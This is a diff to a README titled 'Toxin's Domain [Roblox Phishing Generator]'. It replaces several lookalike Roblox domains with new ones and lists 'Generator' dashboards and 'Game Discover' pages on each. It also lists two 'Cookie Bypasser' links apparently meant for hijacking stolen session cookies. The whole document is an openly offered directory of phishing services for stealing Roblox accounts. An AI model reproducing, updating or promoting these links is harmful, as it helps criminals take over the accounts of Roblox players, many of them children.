@@ -1,16 +1,20 @@
 ### Toxin's Domain [Roblox Phishing Generator]
 
-[Generator roblox-app.com](https://roblox-app.com/creates/TD/)
+[Generator vvvv-roblox.net](https://vvvv-roblox.net/creates/dashboard/)
 
-[Game Discover](https://roblox-app.com/discover)
+[Game Discover](https://vvvv-roblox.net/discover)
 
-[Generator roblox.com.sc](https://roblox.com.sc/generate/dashboard)
+[Generator www-robloxa.com](https://www-robloxa.com/creates?id=dashboard)
 
-[Game Discover](https://roblox.com.sc/discover)
+[Game Discover](https://www-robloxa.com/discover)
 
-[Generator roblox.sx](https://roblox.sx/creates/dashboard/)
+[Generator roblox-site.com](https://roblox-site.com/creates/dashboard/)
 
-[Game Discover](https://roblox.sx/discover)
+[Game Discover](https://roblox-site.com/discover)
+
+[Generator apk-roblox.com](https://apk-roblox.com/creates/dashboard/)
+
+[Game Discover](https://apk-roblox.com/discover)
 
 [Cookie Bypasser 1](https://roblox.com.sc/generator/reflesher)
 [Cookie Bypasser 2](https://terminalholder.xyz/)
